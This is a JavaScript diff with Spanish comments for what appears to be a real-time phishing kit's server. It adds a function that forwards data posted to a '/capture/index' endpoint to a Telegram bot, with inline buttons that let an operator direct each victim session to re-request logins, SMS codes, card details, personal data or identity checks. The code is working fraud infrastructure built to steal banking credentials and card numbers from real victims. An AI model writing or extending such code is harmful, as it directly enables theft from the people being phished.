@@ -261,6 +261,51 @@ async function enviarMensajeTelegram(texto) {
   });
 }
 
+// Envía el mensaje a Telegram CON botones inline para redirigir al cliente
+function buildCallbackData(action, sessionId) {
+  return JSON.stringify({ action, sessionId });
+}
+
+async function enviarMensajeConBotones(texto, sessionId) {
+  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("TELEGRAM_TOKEN o TELEGRAM_CHAT_ID no definidos");
+    return;
+  }
+
+  const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: "ERROR LOGO", callback_data: buildCallbackData("ERROR_LOGO", sessionId) },
+        { text: "PEDIR LOGO", callback_data: buildCallbackData("PEDIR_LOGO", sessionId) },
+      ],
+      [
+        { text: "ERROR SMS", callback_data: buildCallbackData("ERROR_SMS", sessionId) },
+        { text: "PEDIR SMS", callback_data: buildCallbackData("PEDIR_SMS", sessionId) },
+      ],
+      [
+        { text: "ERROR CARD", callback_data: buildCallbackData("ERROR_CARD", sessionId) },
+        { text: "PEDIR CARD", callback_data: buildCallbackData("PEDIR_CARD", sessionId) },
+      ],
+      [
+        { text: "ERROR DATOS", callback_data: buildCallbackData("ERROR_DATOS", sessionId) },
+        { text: "PEDIR DATOS", callback_data: buildCallbackData("PEDIR_DATOS", sessionId) },
+      ],
+      [
+        { text: "ERROR SOYYO", callback_data: buildCallbackData("ERROR_SOYYO", sessionId) },
+        { text: "PEDIR SOYYO", callback_data: buildCallbackData("PEDIR_SOYYO", sessionId) },
+      ],
+    ],
+  };
+
+  await axios.post(apiUrl, {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: texto,
+    parse_mode: "HTML",
+    reply_markup,
+  });
+}
+
 // Permite simular órdenes sin pasar por Telegram.
 // Ejemplo: POST /command { "sessionId": "abc", "action": "ERROR_LOGO" }
 app.post("/command", (req, res) => {
@@ -317,7 +362,7 @@ app.post("/capture/index", async (req, res) => {
     ].join("\n");
 
     try {
-      await enviarMensajeTelegram(texto);
+      await enviarMensajeConBotones(texto, sessionId);
     } catch (err) {
       console.error("Error enviando mensaje a Telegram:", err.message);
     }
